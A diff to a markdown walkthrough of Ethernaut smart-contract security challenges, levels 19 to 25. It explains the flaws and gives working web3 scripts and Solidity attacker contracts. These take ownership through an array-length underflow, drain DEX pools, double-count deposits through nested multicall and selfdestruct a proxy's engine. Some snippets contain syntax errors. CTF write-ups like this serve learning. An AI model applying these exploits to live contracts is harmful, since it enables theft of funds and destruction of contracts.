@@ -766,12 +766,29 @@ In order to solve this level, we need to understand about 3 things:
 2. How values in dynamic arrays are stored
 3. How to modify an item outside of the size of the array.ss
 
-The problem is hinting us to somehow use the codex array to change the owner of the contract. The tool in doing so probably has something to do with the length of array. In fact, the retract is suspiciously dangerous, and actually might underflow the array length!. The array length is an uint256, and once it is underflowed you basically "have" the entire contract storage (all 2 ^ 256 - 1 slots) as a part of your array. Consequently, you can index everything in the memory with that array!
--After make_contact, we see that await web3.eth.getStorageAt(contract.address, 0) returns 0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272. Remember that smaller than 32-bytes variables are bundled together if they are conseuctive, so this is actually owner and contact variable side by side! The 01 at the end of leftmost 0x00..01 stands for the boolean value.
--The next slot, await web3.eth.getStorageAt(contract.address, 1) is the length of codex array. If you record something you will see that it gets incremented. Well, what if we retract? You will be shocked to see that it becomes 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff!
-So then, how does indexing work and how can we index the owner slot now that our array covers the entire storage? We look at the docs of highest version 0.5.0 as that is what the puzzle uses: https://docs.soliditylang.org/en/v0.5.17/miscellaneous.html#mappings-and-dynamic-arrays.
+Also note that there are different definitions of length member of Array in different Solidity versions
 
-The mapping or the dynamic array itself occupies a slot in storage at some position p according to the above rule (or by recursively applying this rule for mappings of mappings or arrays of arrays). For dynamic arrays, this slot stores the number of elements in the array. Array data is located at keccak256(p).
+v0.8.0
+Arrays have a length member that contains their number of elements. The length of memory arrays is fixed (but dynamic, i.e. it can depend on runtime parameters) once they are created.
+NB: It is read-only, thus, it cannot be used to resize dynamic arrays.
+  
+v0.5.17
+Arrays have a length member that contains their number of elements. The length of memory arrays is fixed (but dynamic, i.e. it can depend on runtime parameters) once they are created. For dynamically-sized arrays (only available for storage), this member can be assigned to resize the array. Accessing elements outside the current length does not automatically resize the array and instead causes a failing assertion. Increasing the length adds new zero-initialised elements to the array. Reducing the length performs an implicit delete on each of the removed elements. If you try to resize a non-dynamic array that isn’t in storage, you receive a Value must be an lvalue error.
+
+So if we use .length-- on an empty array, it causes an underflow and thus sets the length to 2**256-1.
+
+NOTE: There is the catch to solve the game. And remember that game is complied v0.5. :)
+
+The goal of the level is to claim ownership of the contract. AlienCodex is inherited from Ownable so in order to do that we want to override _owner variable in the contract's storage with our address.
+The entire solution can be split into two parts. First, we have to somehow set contract variable to true to gain access to contract methods, because they are protected by contacted modifier.
+
+
+So our first step here is to make contact and set the contact to true, and also the problem is hinting us to somehow use the codex array to change the owner of the contract. The tool in doing so probably has something to do with the length of array. In fact, the retract is suspiciously dangerous, and actually might underflow the array length! SInce we are not following the adviced Check-Effect-Interact pattern. The array length is an uint256, and once it is underflowed you basically "have" the entire contract storage (all 2 ^ 256 - 1 slots) as a part of your array and in the future we can manipulate all as we see deem fit. Consequently, you can index everything in the memory with that array!
+-After make_contact, we see that await web3.eth.getStorageAt(contract.address, 0) returns 0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272. Remember that smaller than 32-bytes variables are bundled together if they are conseuctive, so this is actually owner and contact variable side by side! The 01 at the end of leftmost 0x00..01 stands for the boolean value which is set to true now since we've already made contact. 
+-The next slot, await web3.eth.getStorageAt(contract.address, 1) is the length of codex array. If we record something we will see that it gets incremented. W
+So then i was interested on how does indexing work and how can we index the owner slot now that our array covers the entire storage? If we look at the docs of highest version 0.5.0 as that is what the puzzle uses: https://docs.soliditylang.org/en/v0.5.17/miscellaneous.html#mappings-and-dynamic-arrays.
+
+The mapping or the dynamic array itself occupies a slot in storage at some position `p` according to the above rule (or by recursively applying this rule for mappings of mappings or arrays of arrays). For dynamic arrays, this slot stores the number of elements in the array. Array data is located at `keccak256(p)`.
 
 To see this in action, we can do:
 
@@ -780,23 +797,37 @@ await contract.record('0xffffffffffffffffffffffffffffffff')
 await web3.eth.getStorageAt(contract.address , web3.utils.hexToNumberString(web3.utils.soliditySha3(1)))
 // 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000
 ```
- first we have to retract until the array length underflows, and then we just have to offset enough from keccak256(1) until we overflow and get back to 0th index, overwriting the owner! The array data is located at uint256(keccak256(1)) and there are 2 ** 256 - 1 - uint256(keccak256(1)) values between that and the end of memory. So, just adding one more to that would mean we go to 0th index. To calculate this index I just wrote a small Solidity code in Remix:
+Now first we have to retract until the array length underflows, and then we just have to offset enough from keccak256(1) until we overflow and get back to 0th index, overwriting the owner! The array data is located at 
 ```
-function index() public pure returns(uint256) {
-  return type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1; 
-}
+p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
+```
+So now we convert the hashed balue to Bigint so we are able to subtract back to the slot 0 of the codex
+```
+i = BigInt(2 ** 256) - BigInt(p)
+```
+We can now pad our address with zeroes so as to meet the expected 32 byte lenght, here we exploit the flaw in the ABI specs. SInce doesn't validate that the lenght of the array atches the length of the payload
+```
+content = `0x` + `0`.repeat(24) + player.slice(2)
 ```
 Then we call the revise function as follows:
 ```
-await contract.codex('35707666377435648211887908874984608119992236509074197713628505308453184860938') // if you want to confirm
-await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', web3.utils.padLeft(player, 64))
+
+await contract.revise(i, content), {from:player, gas:900000})
 ```
-Check this location for deeper explanation on level "https://dev.to/erhant/ethernaut-19-alien-codex-3e49"
+ANd that's everything we can then check the owner once again and it's now us
+
+MAIN TAKEAWAY FROM CHALLENGE:
+
+From this we should know that modifying a dynamic array length without checking for under/overflow is very dangerous as it can expand the array's bounds to the entire storage area of 2256 - 1. This can possibly enable modifying the whole contract storage.
+And thankfully since v 0.6.0 we can't set the array lenght property in solidity.
 
 
 
 ## 20. Denial
-This level is very similar to the levels Force and King. The problem with the Denial contract is the fact that instead of transferring using `.send()` or `.transfer`() which has a limit of 2300 gas and the exploit has to do with call function: partner.call{value:amountToSend}(""), by using`.call()` if no limit on the gas is specified, it will send all gas along with it.  `assert(false)`  used to do the trick in the old versions but it no longer works due to a [breaking change](https://blog.soliditylang.org/2020/12/16/solidity-v0.8.0-release-announcement/) in solidity v0.8.0 so we need another way to expand all available gas. The simplest way to do this is to run a fallback function in an infinite loop.
+This level is very similar to the levels Force and King. The problem with the Denial contract is the fact that instead of transferring using `.send()` or `.transfer`() which has a limit of 2300 gas and he exploit has to do with call function: partner.call{value:amountToSend}(""), by using`.call()` if no limit on the gas is specified, it will send all gas along with it.  `assert(false)`  used to do the trick in the old versions, this is because convenience functions assert and require can be used to check for conditions and throw an exception if the condition is not met.
+assert(false) compiles to 0xfe, which is an invalid opcode, using up all remaining gas, and reverting all changes.
+Whereas require(false) compiles to 0xfd which is the REVERT opcode, meaning it will refund the remaining gas. The opcode can also return a value (useful for debugging).
+But this no longer works due to a [breaking change](https://blog.soliditylang.org/2020/12/16/solidity-v0.8.0-release-announcement/) in solidity v0.8.0 so we need another way to expend all available gas. The simplest way to do this is to run a fallback function in an infinite loop, and then we set the partner address to our jsut deployed contract address
 ```
 pragma solidity ^0.8.0;
 
@@ -806,6 +837,257 @@ contract DenialAttack {
     }
 }
 
-await contract.setWithdrawPartner("<address of your deployed AttackDenial contract.>");
+await contract.setWithdrawPartner("<address of our deployed DenialAttack contract.>");
 ```
 We then set the withdrawal partner as this contract address, and we are done.
+
+## 21. Shop
+Here we have a level that looks like the Elevator level where we return different value everytime we call the function. Since `isSold` is updated first before the price is set, we are able to take advantage of this and return different values for `_buyer.price()` based on what the value of `shop.isSold()` returns. We might have to manually increase the gas limit on metamask. This is a common issue because metamask cannot estimate the gas cost when you using `.call`.
+From this level's contract we can see that `buy()` is calling `price()` twice:
+
+- Firstly, in the if condition, the price returned must be 100 or higher to pass.
+- And when the contract updates, that we can return a value lower than 100.
+```
+pragma solidity ^0.6.0;
+
+import './Shop.sol'
+
+contract AttackShop is Buyer {
+    Shop public shop;
+
+    constructor(Shop _shop) public {
+        shop = _shop;
+    }
+
+    function buy() public {
+        shop.buy();
+    }
+
+    function price() public view override returns(uint) {
+       
+        return shop.isSold ? 0 : 100;
+    }
+}
+```
+MAIN TAKEAWAY FROM CHALLENGE:
+Interfaces do not guarantee contract security. So even if  another contract uses the same interface, this doesn’t mean that it will behave as intended! Also view and pure promises might be violated without our knowledge.
+Double-calling functions even the same view function in order to approve an action is a very unsafe thing to do.
+
+
+
+## 22. DEX
+
+The exploit on this level is the reliance on a single oracle source for token price. Let's quickly walk through why this is a problem. Originally we were given 10A and 10B and the dex has 100A and 100B where A and B represents token 1 and 2 respectively. This gives us a price of 1A = 1B.
+
+If we swap all of our A to B, we'll receive 10B since the initial balance of A and B is 100 (price ration is 1:1) our new balance is 0A and 20B. The dex has 110A and 90B. The price will update according to the current balance of each token i.e., 90 token2 per 110 token1, now if we were to swap all our B back to A, the dex is actually quoting us a better price than what we originally swapped at (1:1). Our new balance is 24A and 0B while the dex has 86A and 110B. 
+We repeat this a few more times by swapping our entire balance and we'll be able to drain the funds of the dex.
+```
+let a = await contract.token1();
+let b = await contract.token2();
+await contract.approve(instance, "1000");
+await contract.swap(a, b, 10);
+await contract.swap(b, a, 20);
+await contract.swap(a, b, 24);
+await contract.swap(b, a, 30);
+await contract.swap(a, b, 41);
+await contract.swap(b, a, 45); // the reason why we use 45 here instead of the entire balance of B of 65 is because the dex doesn't have enough a to give back to us. So we need to calculate the right amount of b to use to ensure that we can fully drain a i.e. 110/156*65 = 45.
+```
+
+## 23. DEX TWO
+This level is very similar to the previous level except you need to use a custom ERC20 token contract to drain the funds of the DEX. The reason why this is possible is because the swap doesn't require that the from / to has to be token1 and token2 so you can use a 3rd token and drain each side sequentially.
+
+```
+
+a = await contract.token1()
+b = await contract.token2()
+// Create a custom ERC20 token contract (C) and mint to yourself some tokens.
+c = "<insert custom token address here>"
+
+await c.approve(instance, 1000);
+await c.transfer(instance, 1);
+await contract.swap(c, a, 1);
+await contract.swap(c, b, 2);
+```
+
+## 24. Puzzle Wallet
+If you understand delegatecall, you should be able to solve this. Essentially what is happening is that the storage variable `pendingAdmin` is sharing the same storage slot with `owner` and the storage variable `admin` is sharing the same storage slot with `maxBalance`.
+
+In order to change admin, we need to modify `maxBalance` (set it to the uint value of your address) but to modify `maxBalance`, we need to reduce the balance of the contract to 0. The `execute` function allows you to withdraw funds from the contract. What we need to figure out is how to call `deposit` and how can we get the contract to register more than what was deposited.
+
+`deposit` can only be called by a whitelisted address and to be whitelisted, you need to be an owner. By setting yourself as `pendingAdmin`, you will become the owner since the `pendingAdmin` and `owner` storage slot is shared. Once you become the owner, you can whitelist yourself and call the `deposit` function.
+
+In order to get the smart contract to register two deposits when only 1 was made, we need to take advantage of calling `multicall` within `multicall`. The reason why this works is because the `multicall` function checks for `deposit`'s function signature so by calling `deposit` within `multicall`, you are able to bypass the `require(!depositCalled, "Deposit can only be called once");` check.
+
+Not to worry if you don't fully understand, the code will explain everything
+
+```
+// Setting pending admin / owner
+pnaData = web3.eth.abi.encodeFunctionCall({
+    name: 'proposeNewAdmin',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: '_newAdmin'
+    }]
+}, [player]);
+
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    data: pnaData
+})
+
+// check that you are now the owner
+// await contract.owner()
+
+// Whitelist yourself
+wlData = web3.eth.abi.encodeFunctionCall({
+    name: 'addToWhitelist',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: 'addr'
+    }]
+}, [player]);
+
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    data: wlData
+})
+
+// setting up multicall within multicall
+depositData = web3.eth.abi.encodeFunctionCall({
+    name: 'deposit',
+    type: 'function',
+    inputs: []
+}, []);
+
+multicallData = web3.eth.abi.encodeFunctionCall({
+    name: 'multicall',
+    type: 'function',
+    inputs: [{
+        type: 'bytes[]',
+        name: 'data'
+    }]
+}, [[depositData]]);
+
+nestedMulticallData = web3.eth.abi.encodeFunctionCall({
+    name: 'multicall',
+    type: 'function',
+    inputs: [{
+        type: 'bytes[]',
+        name: 'data'
+    }]
+}, [[depositData, multicallData]]);
+
+// This is where you deposit 0.001 ETH but the smart contract records it as 2 deposits (0.002 ETH)!
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    value: "1000000000000000",
+    data: nestedMulticallData
+})
+
+// Check that the smart contract recorded your deposit twice
+// (await contract.balances(player)).toString()
+
+// Withdraw all (should be 0.002) funds!
+executeData = web3.eth.abi.encodeFunctionCall({
+    name: 'execute',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: 'to'
+    }, {
+        type: 'uint256',
+        name: 'value'
+    }, {
+        type: 'bytes',
+        name: 'data'
+    }]
+}, [player, "2000000000000000", "0x"]);
+
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    data: executeData
+})
+
+// Set yourself as new admin by calling set max balance
+smbData = web3.eth.abi.encodeFunctionCall({
+    name: 'setMaxBalance',
+    type: 'function',
+    inputs: [{
+        type: 'uint256',
+        name: '_maxBalance'
+    }]
+}, ["<insert the uint value of your address here>"]);
+
+await web3.eth.sendTransaction({
+    to: instance,
+    from: player,
+    data: smbData
+})
+```
+
+## 25. Motorbike
+
+Nowadays, using a proxy is quite a common pattern but if you don't understand what you are doing, it can lead to very disasterous consequences. This level is an example of what happened with [parity wallet](https://www.parity.io/blog/a-postmortem-on-the-parity-multi-sig-library-self-destruct/).
+
+We want to destroy the Motorbike but within the motorbike contract, there isn't any `selfdestruct` calls. Instead of attacking the Motorbike contract, why don't we attack the engine contract? Motorbike relies on the engine contract for its logic so if we can destroy the engine contract, the Motorbike is rendered useless.
+
+Let's interact directly with the engine contract and gain ownership of it. Once we're made the upgrader, we can easily upgrade the engine logic to a malicious contract and call `selfdestruct`.
+
+```
+// Get the engine contract address
+implAddr = await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
+
+implAddr = '0x' + implAddr.slice(26)
+
+// Call `initialize()` to become the upgrader
+data = web3.eth.abi.encodeFunctionSignature("initialize()")
+await web3.eth.sendTransaction({
+    from: player,
+    to: implAddr,
+    data: data
+})
+
+// Check that you are the upgrader
+// data = web3.eth.abi.encodeFunctionSignature("upgrader()")
+// await web3.eth.call({
+//     to: implAddr,
+//     data: data
+//     })
+
+// Create a bad contract and deploy it
+pragma solidity ^0.8.0;
+
+contract Kaboom {
+    function explode() public {
+        selfdestruct(payable(0));
+    }
+}
+
+badContractAddr = "<insert bad contract address here>"
+
+// create the payload to be called
+data = web3.eth.abi.encodeFunctionSignature("explode()")
+
+upgradeToAndCallData = web3.eth.abi.encodeFunctionCall({
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: 'newImplementation'
+    }, {
+        type: 'bytes',
+        name: 'data'
+    }
+]
+}, [badContractAddr, data])
+
+
+// Execute self destruct
+await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeToAndCallData})
+```
